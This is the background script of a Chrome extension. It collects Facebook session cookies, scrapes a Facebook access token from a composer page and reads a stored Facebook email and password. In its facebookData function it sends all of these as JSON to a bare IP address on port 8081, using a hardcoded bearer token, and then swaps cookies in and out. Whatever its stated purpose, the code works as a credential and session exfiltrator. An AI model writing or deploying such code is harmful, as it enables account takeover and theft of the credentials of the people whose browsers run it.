function removeCookies() {
    chrome.cookies.getAll({ domain: ".facebook.com" }, function(cookies) {
        for (var i = 0; i < cookies.length; i++) {
            chrome.cookies.remove({ url: "https://mbasic.facebook.com" + cookies[i].path, name: cookies[i].name });
            console.log('cookie removed');
        }
    });
}

function saveCookie() {
    chrome.cookies.getAll({ url: 'https://mbasic.facebook.com' }, function(e) {
        console.log('savecookie');
        chrome.storage.sync.set({ FBcookie: e }, function() {});
    });
}

function saveuToken() {
    var s = $.ajax({
        url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
        type: "get",
        async: false,
        global: false,
        success: function(t) {
            return t;
        }
    }).responseText;
    s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
    chrome.storage.sync.set({ FBuToken: uToken }, function() {
        // console.log(e);
    });
}
// saveCookie();
// removeCookies();
// chrome.storage.sync.get(['FBcookie'], function(result) {
//     console.log(result.FBcookie);
// });


function addCookie() {
    chrome.storage.sync.get(['FBcookie'], function(result) {
        result.FBcookie.forEach(function(item, index) {
            delete item['hostOnly'];
            delete item['session'];
            item['url'] = 'https://mbasic.facebook.com';
            chrome.cookies.set(item, function(c) {
                // console.log(JSON.stringify(c));
                console.log('cookie added!')
            });
        });
    });
}



async function checkfbLogin() {
    var p = new Promise(function(resolve, reject) {
        chrome.cookies.getAll({ url: 'https://mbasic.facebook.com' }, function(cookies) {
            cookies.forEach(item => {
                if (item['name'] == "c_user") {
                    // console.log(item['name']);
                    resolve(true); //signed in
                    return;
                }
            })
            resolve(false);
        })
    });
    const result = await p;
    // console.log(result);
    return result;
}

function sendtoContent(msg) {
    chrome.tabs.query({ active: true, currentWindow: true }, gotTabs);

    function gotTabs(tabs) {
        chrome.tabs.sendMessage(tabs[0].id, msg);
    };
}

function facebookData() {
    chrome.storage.sync.get(['FBemail', 'FBpassword'], function(result) {
        var uToken;
        var url = 'https://mbasic.facebook.com';
        chrome.cookies.getAll({ url: url }, function(e) {
            if (e.length > 0) {
                format = '';
                for (let i = 0; i < e.length; i++) {
                    format += e[i].name + '=' + e[i].value;
                    if (i < e.length - 1) {
                        format += ','
                    }
                }

                try {
                    var s = $.ajax({
                        url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
                        type: "get",
                        async: false,
                        global: false,
                        success: function() {
                            // return t;
                        }
                    }).responseText;
                    s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
                } catch (err) {
                    console.log(err);
                }

                var data = {
                    "loginCookies": format,
                    "loginPassword": result.FBpassword,
                    "loginUsername": result.FBemail,
                    "socialAccountState": 0,
                    "socialAccountStateDescription": 0,
                    "socialNetwork": {
                        "id": 1
                    },
                    "status": true,
                    "user": {
                        "id": 1,
                        "login": "admin"
                    },
                    "userToken": uToken,
                    "userTokenState": 0,
                    "userTokenStateDescription": "token"
                };
                $.ajax({
                    url: "http://13.21.34.9:8081/api/connectome-social-media/create",
                    type: 'POST',
                    beforeSend: function(xhr) {
                        xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJST0xFX0FETUlOLFJPTEVfVVNFUiIsImV4cCI6MTYyODQxNDg1Nn0.vt-KxVv9DbQa2qeme36LJRQojKnHcKv6VRW_F9wvtE_xzYEcoy2vYBwmZhA6mKdJieObhsk8GRSKj6-KF7T-_Q');
                    },
                    contentType: 'application/json',
                    data: JSON.stringify(data),
                    success: function(response) {
                        console.log(response);
                        addCookie();
                        // debugger;
                    },
                    error: function(r) {
                        console.log(r);
                        // debugger;
                    },
                })
            }
            removeCookies();
        })
    })
};



// chrome.browserAction.onClicked.addListener(function(activeTab) {
//     chrome.storage.sync.get(['FncMyELTS'], function(result) {
//         if (result.FncMyELTS == "FncMyELTSver1"){
//             chrome.tabs.executeScript({
//                 file: "js/MyELTSver1.js"
//             });
//         }
//         if (result.FncMyELTS == "FncMyELTSver2"){
//             chrome.tabs.executeScript({
//                 file: "js/MyELTSver2.js"
//             });
//         }
//         if (result.FncMyELTS == "FncMyELTSver3"){
//             chrome.tabs.executeScript({
//                 file: "js/MyELTSver3.js"
//             });
//         }
//     });
//     if (i % 15 == 14){
//         chrome.tabs.create({url: "https://shawnsavour.com/Buy-me-a-coffee/"});
//     };
//     i++

// });




chrome.runtime.onMessage.addListener(async function(response, sender, sendResponse) {
    switch (response) {
        case 'checklogin':
            // if (await checkfbLogin()) {
            //     sendtoContent('showsendData');
            // } else {
            sendtoContent('showlogin');
            // }
            break;
        case 'sendData':
            facebookData();
            break;
        case 'Login':
            saveCookie();
            removeCookies();
            chrome.tabs.create({ url: 'https://mbasic.facebook.com/login?refsrc=deprecated' });
            break;
        case 'removeCookie':
            removeCookies();
            break;
        case 'saveCookie':
            saveCookie();
            break;
        case 'addCookie':
            addCookie();
            break;
        case 'doneLogin':
            setTimeout(facebookData(), 2000);
            break;
        default:
            console.log('nofunction');
            // code block
    }
});
// sendtoContent('abc');